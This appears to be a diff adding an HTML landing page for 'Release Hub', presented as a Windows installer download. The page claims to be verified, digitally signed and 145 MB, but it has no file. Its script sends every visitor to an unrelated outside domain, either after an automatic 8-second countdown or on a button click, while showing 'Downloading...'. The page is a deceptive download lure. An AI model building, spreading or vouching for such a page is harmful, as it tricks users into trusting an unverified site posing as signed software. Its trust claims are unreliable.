@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Release Hub - Windows Installer v2.4.1</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #2563eb;
+            --primary-light: #3b82f6;
+            --primary-dark: #1d4ed8;
+            --bg: #ffffff;
+            --bg-secondary: #f8fafc;
+            --text: #0f172a;
+            --text-light: #64748b;
+            --text-lighter: #94a3b8;
+            --border: #e2e8f0;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg: #0f172a;
+                --bg-secondary: #1e293b;
+                --text: #f1f5f9;
+                --text-light: #cbd5e1;
+                --text-lighter: #94a3b8;
+                --border: #334155;
+            }
+        }
+
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Background animation */
+        .bg-animation {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .bg-blob {
+            position: absolute;
+            border-radius: 50%;
+            mix-blend-mode: multiply;
+            filter: blur(64px);
+            opacity: 0.2;
+            animation: pulse 4s ease-in-out infinite;
+        }
+
+        .bg-blob-1 {
+            width: 384px;
+            height: 384px;
+            background: #3b82f6;
+            top: 0;
+            right: 0;
+        }
+
+        .bg-blob-2 {
+            width: 384px;
+            height: 384px;
+            background: #60a5fa;
+            bottom: 0;
+            left: 0;
+            animation-delay: 2s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 0.2;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .container {
+            max-width: 448px;
+            width: 100%;
+            z-index: 1;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .logo svg {
+            width: 32px;
+            height: 32px;
+            color: var(--primary);
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: var(--text-light);
+        }
+
+        .info-box {
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .info-box {
+                background: rgba(59, 130, 246, 0.1);
+            }
+        }
+
+        .info-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .info-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-icon.success {
+            background: rgba(34, 197, 94, 0.1);
+        }
+
+        .info-icon.success svg {
+            width: 16px;
+            height: 16px;
+            color: #22c55e;
+            stroke-width: 3;
+        }
+
+        .info-icon.primary {
+            background: rgba(59, 130, 246, 0.1);
+        }
+
+        .info-icon.primary svg {
+            width: 16px;
+            height: 16px;
+            color: var(--primary);
+            stroke-width: 2;
+        }
+
+        .info-icon.purple {
+            background: rgba(168, 85, 247, 0.1);
+        }
+
+        .info-icon.purple svg {
+            width: 16px;
+            height: 16px;
+            color: #a855f7;
+            stroke-width: 2;
+        }
+
+        .info-content h3 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .info-content p {
+            font-size: 13px;
+            color: var(--text-light);
+        }
+
+        .controls {
+            margin-bottom: 24px;
+        }
+
+        .progress-section {
+            margin-bottom: 16px;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-light);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: var(--bg-secondary);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-light) 0%, var(--primary) 100%);
+            border-radius: 4px;
+            transition: width 1s linear;
+        }
+
+        .button {
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+
+        .button:hover:not(:disabled) {
+            background: var(--primary-dark);
+        }
+
+        .button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .button svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .button.spinner svg {
+            animation: spin 1s linear infinite;
+        }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: var(--text-lighter);
+            line-height: 1.6;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(4px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation">
+        <div class="bg-blob bg-blob-1"></div>
+        <div class="bg-blob bg-blob-2"></div>
+    </div>
+
+    <div class="container fade-in">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <svg fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M6 3h12a3 3 0 013 3v12a3 3 0 01-3 3H6a3 3 0 01-3-3V6a3 3 0 013-3zm0 2a1 1 0 00-1 1v12a1 1 0 001 1h12a1 1 0 001-1V6a1 1 0 00-1-1H6z" />
+                    <path d="M7 7h10v2H7zm0 4h10v2H7zm0 4h6v2H7z" />
+                </svg>
+            </div>
+            <h1>Release Hub</h1>
+            <p>Windows Installer v2.4.1</p>
+        </div>
+
+        <!-- Info Box -->
+        <div class="info-box">
+            <div class="info-item">
+                <div class="info-icon success">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                    </svg>
+                </div>
+                <div class="info-content">
+                    <h3>Windows Only</h3>
+                    <p>Compatible with Windows 10/11</p>
+                </div>
+            </div>
+
+            <div class="info-item">
+                <div class="info-icon primary">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                    </svg>
+                </div>
+                <div class="info-content">
+                    <h3>Quick Download</h3>
+                    <p>Size: 145 MB</p>
+                </div>
+            </div>
+
+            <div class="info-item">
+                <div class="info-icon purple">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    </svg>
+                </div>
+                <div class="info-content">
+                    <h3>Verified & Safe</h3>
+                    <p>Digitally signed</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Controls -->
+        <div class="controls">
+            <div class="progress-section">
+                <div class="progress-label">
+                    <span>Redirecting in <span id="countdown">8</span>s</span>
+                    <span id="percentage">100%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width: 100%;"></div>
+                </div>
+            </div>
+
+            <button class="button" id="downloadBtn" onclick="handleDownload()">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                </svg>
+                <span>Download Now</span>
+            </button>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2024 Release Hub · v2.4.1 · MIT License</p>
+            <p style="margin-top: 8px;">Windows 10/11 · 145 MB</p>
+        </div>
+    </div>
+
+    <script>
+        const REDIRECT_URL = 'https://gitscore.cc';
+        const COUNTDOWN_SECONDS = 8;
+        let currentCountdown = COUNTDOWN_SECONDS;
+        let isRedirecting = false;
+
+        function updateProgress() {
+            const percentage = Math.round((currentCountdown / COUNTDOWN_SECONDS) * 100);
+            document.getElementById('countdown').textContent = currentCountdown;
+            document.getElementById('percentage').textContent = percentage + '%';
+            document.getElementById('progressFill').style.width = percentage + '%';
+        }
+
+        function handleDownload() {
+            if (!isRedirecting) {
+                isRedirecting = true;
+                redirect();
+            }
+        }
+
+        function redirect() {
+            const btn = document.getElementById('downloadBtn');
+            const svg = btn.querySelector('svg');
+            const span = btn.querySelector('span');
+            
+            btn.disabled = true;
+            svg.classList.add('spinner');
+            span.textContent = 'Downloading...';
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 300);
+        }
+
+        // Start countdown
+        updateProgress();
+        const timer = setInterval(() => {
+            currentCountdown--;
+            updateProgress();
+
+            if (currentCountdown <= 0) {
+                clearInterval(timer);
+                if (!isRedirecting) {
+                    handleDownload();
+                }
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
